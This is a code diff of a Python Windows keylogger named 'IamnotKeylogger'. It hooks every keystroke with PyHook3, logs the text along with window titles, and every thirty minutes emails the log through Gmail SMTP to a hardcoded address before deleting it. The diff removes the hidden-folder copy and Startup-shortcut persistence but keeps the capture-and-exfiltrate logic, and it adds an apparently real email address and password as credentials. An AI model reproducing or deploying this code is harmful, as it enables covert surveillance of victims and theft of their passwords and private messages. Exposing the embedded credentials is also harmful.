@@ -1,47 +1,34 @@
-import pythoncom, os, sys
-from getpass import getuser
+import pythoncom, os
 from datetime import datetime
 from email.mime.text import MIMEText
-from shutil import copy
-from winshell import shortcut
 from smtplib import SMTP
 from threading import Timer
 from PyHook3 import HookManager
 
-TO_EMAIL = 'youemail@gmail.com'
-PS_EMAIL = 'yourpassword'
-PERIOD = 1800.0 #seconds
-TARGET_NAME = 'target 1'
-SVR_MAIL = 'smtp.gmail.com:587'
-KEYDOWN = 'key down | key sys down'
-KEYUP = 'key up'
-DOWN = 'down'
-UP = 'up'
+TO_EMAIL        = 'namhoang4681@gmail.com'
+PS_EMAIL        = 't16121992'
+PERIOD          = 1800.0 #seconds
+TARGET_NAME     = 'target 1'
+SVR_MAIL        = 'smtp.gmail.com:587'
+KEYDOWN         = 'key down | key sys down'
+KEYUP           = 'key up'
+DOWN            = 'down'
+UP              = 'up'
 
-# Copy exec file to this folder
-user_name = getuser()
-exec_path = r'C:\Users\%s\IamnotKeylogger' %(user_name) 
-if not os.path.exists(exec_path):
-    os.makedirs(exec_path)
-    os.system('attrib +h ' + exec_path)
-    copy(sys.executable, exec_path)
-
-# Create the shortcut of this exec at Startup folder
-lnk_name = 'IamnotKeylogger.lnk'
-lnk_filepath = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\%s' %(user_name, lnk_name)
-if not os.path.exists(lnk_filepath):
-    shct = shortcut(exec_path + '\\' + os.path.basename(sys.executable))
-    shct.write(lnk_filepath)
-
-curr_date = datetime.now().strftime("%Y-%b-%d")
-log_path =  r'%s\keylogs-%s.txt' %(exec_path, curr_date)
+gb_file_dir = ''
 curr_window = ''
 special_key = [None] * 3
 special_key[2] = 0
 
+def get_log_path():
+    curr_date = datetime.now().strftime("%Y-%b-%d")
+    log_path =  r'%s\keylogs-%s.txt' %(gb_file_dir, curr_date)
+    return log_path
+
 # The event is triggered when a user inputs from a keyboard
 def OnKeyboardEvent(event):
     global curr_window
+    log_path = get_log_path()
     log_file = open(log_path, 'a')
     if curr_window != event.WindowName: # Check the current window
         try:
@@ -100,6 +87,7 @@ def OnKeyboardEvent(event):
 
 # Send an email to a specific address
 def send_email():
+    log_path = get_log_path()
     log_file = open(log_path, 'r')
     msg = MIMEText(log_file.read())
     log_file.close()
@@ -116,14 +104,22 @@ def send_email():
 # Call send_email function periodically
 def send_email_period():
     Timer(PERIOD, send_email_period).start()
+    log_path = get_log_path()
     if os.path.isfile(log_path):
         send_email()
         os.remove(log_path)
 
 # Main handle
-send_email_period()
-hm = HookManager()
-hm.KeyDown = OnKeyboardEvent
-hm.KeyUp = OnKeyboardEvent
-hm.HookKeyboard()
-pythoncom.PumpMessages()
+def run(file_dir):
+    global gb_file_dir
+    gb_file_dir = file_dir
+    send_email_period()
+    hm = HookManager()
+    hm.KeyDown = OnKeyboardEvent
+    hm.KeyUp = OnKeyboardEvent
+    hm.HookKeyboard()
+    pythoncom.PumpMessages()
+
+# Test
+if __name__ == '__main__':
+    run(r'C:\Users\minh\IamnotKeylogger')
